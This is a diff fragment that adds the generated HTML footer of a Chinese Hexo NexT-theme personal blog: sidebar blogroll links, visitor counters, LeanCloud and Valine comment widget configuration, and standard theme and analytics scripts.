+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:i@southsea.st" title="E-Mail → mailto:i@southsea.st"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.codemonster.cn/" title="https:&#x2F;&#x2F;www.codemonster.cn&#x2F;" rel="noopener" target="_blank">Xishir</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lmxspace.com/" title="http:&#x2F;&#x2F;www.lmxspace.com&#x2F;" rel="noopener" target="_blank">L1nk3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://she1don.cn/" title="http:&#x2F;&#x2F;she1don.cn&#x2F;" rel="noopener" target="_blank">Sheldon</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yuf1sher.xyz/" title="http:&#x2F;&#x2F;www.yuf1sher.xyz&#x2F;" rel="noopener" target="_blank">saltyfishyu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.backcover7.cc/" title="https:&#x2F;&#x2F;blog.backcover7.cc&#x2F;" rel="noopener" target="_blank">backcover7</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cyto.top/" title="https:&#x2F;&#x2F;cyto.top&#x2F;" rel="noopener" target="_blank">Cytosine</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/PeterZ1997/" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;PeterZ1997&#x2F;" rel="noopener" target="_blank">PeterZ</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://ju5tw4nty0u.top/" title="http:&#x2F;&#x2F;ju5tw4nty0u.top&#x2F;" rel="noopener" target="_blank">ju5tw4nty0u</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.thecosmos.cn/" title="http:&#x2F;&#x2F;blog.thecosmos.cn&#x2F;" rel="noopener" target="_blank">Cosmos</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nepire.github.io/" title="https:&#x2F;&#x2F;nepire.github.io&#x2F;" rel="noopener" target="_blank">Nepire</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.anonym1ty.cn/" title="http:&#x2F;&#x2F;www.anonym1ty.cn&#x2F;" rel="noopener" target="_blank">豆浆油条</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://a3ura.github.io/" title="https:&#x2F;&#x2F;a3ura.github.io&#x2F;" rel="noopener" target="_blank">A3ura</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://lihuaiqiu.github.io/" title="https:&#x2F;&#x2F;lihuaiqiu.github.io&#x2F;" rel="noopener" target="_blank">离怀秋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.zhaoj.in/" title="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;" rel="noopener" target="_blank">glzjin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.sketchplane.top/" title="http:&#x2F;&#x2F;www.sketchplane.top&#x2F;" rel="noopener" target="_blank">sketch_pl4ne</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yk2.work/" title="http:&#x2F;&#x2F;www.yk2.work&#x2F;" rel="noopener" target="_blank">yk2</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.star123.top/" title="http:&#x2F;&#x2F;www.star123.top&#x2F;" rel="noopener" target="_blank">star</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟丷</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+      -->
+      有
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-divider">只猫来偷了</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+      -->
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+      条鱼
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"rebG01SwSXMoY7eaX8QScfRV-MdYXbMMI","app_key":"u3yrkhkuseHahqDsz60AhPYz","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'I06GJpS9glw9Vb019QqawEVk-gzGzoHsz',
+      appKey     : 'cicAwmh5fPIP0nA0oiNQRhQk',
+      placeholder: "喵！被我抓到你偷鱼了！",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
